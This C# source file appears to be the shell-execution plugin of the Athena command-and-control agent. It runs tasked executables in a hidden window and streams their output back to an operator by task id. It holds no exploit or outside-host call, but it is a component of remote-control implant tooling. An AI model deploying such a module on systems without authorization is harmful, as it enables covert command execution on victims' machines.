using PluginBase;
using System;
using System.Collections.Concurrent;
using System.Collections.Generic;
using System.Diagnostics;
using System.Text;

namespace Plugins
{
    public class Plugin : AthenaPlugin
    {
        Dictionary<string, Process> runningProcs = new Dictionary<string, Process>();
        public override void Execute(Dictionary<string, object> args)
        {
            try
            {
                PluginHandler.AddResponse(ShellExec(args));
            }
            catch (Exception e)
            {
                //oh no an error
                PluginHandler.Write(e.ToString(), (string)args["task-id"], true, "error");
            }
        }
        public void Kill(Dictionary<string, object> args)
        {
            try
            {
                if (runningProcs.ContainsKey((string)args["task-id"]))
                {
                    runningProcs[(string)args["task-id"]].Kill();
                    runningProcs[(string)args["task-id"]].WaitForExit();

                    PluginHandler.AddResponse(new ResponseResult()
                    {
                        task_id = (string)args["task-id"],
                        user_output = "Job Cancelled.",
                        completed = "true",
                    });
                }
            }
            catch (Exception e)
            {

                PluginHandler.AddResponse(new ResponseResult()
                {
                    task_id = (string)args["task-id"],
                    user_output = e.ToString(),
                    completed = "true",
                    status = "error",
                });
            }
        }
        public ResponseResult ShellExec(Dictionary<string, object> args)
        {
            string parameters = "";
            if (!String.IsNullOrEmpty((string)args["arguments"]))
            {
                parameters = (string)args["arguments"];
            }

            string executable = (string)args["executable"];


            Process process = new Process
            {
                StartInfo = new ProcessStartInfo()
                {
                    UseShellExecute = false,
                    CreateNoWindow = true,
                    WindowStyle = ProcessWindowStyle.Hidden,
                    FileName = executable,
                    Arguments = parameters,
                    RedirectStandardError = true,
                    RedirectStandardOutput = true
                }
            };

            try
            {
                process.ErrorDataReceived += (sender, errorLine) => { if (errorLine.Data is not null) PluginHandler.Write(errorLine.Data + Environment.NewLine, (string)args["task-id"], false, "error"); };
                process.OutputDataReceived += (sender, outputLine) => { if (outputLine.Data is not null) PluginHandler.Write(outputLine.Data + Environment.NewLine, (string)args["task-id"], false); };

                process.Start();
                process.BeginErrorReadLine();
                process.BeginOutputReadLine();

                process.WaitForExit();

                ResponseResult result = new ResponseResult()
                {
                    user_output = Environment.NewLine + "Process Finished.",
                    task_id = (string)args["task-id"],
                    completed = "true",
                };

                if (process.ExitCode != 0)
                {
                    result.status = "error";
                    result.user_output += Environment.NewLine + "Process exited with code: " + process.ExitCode;
                }

                return result;
            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    //user_output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message,
                    user_output = Environment.NewLine + e.ToString(),
                    task_id = (string)args["task-id"],
                    completed = "true",
                    status = "error"
                };
            }
        }
    }
}
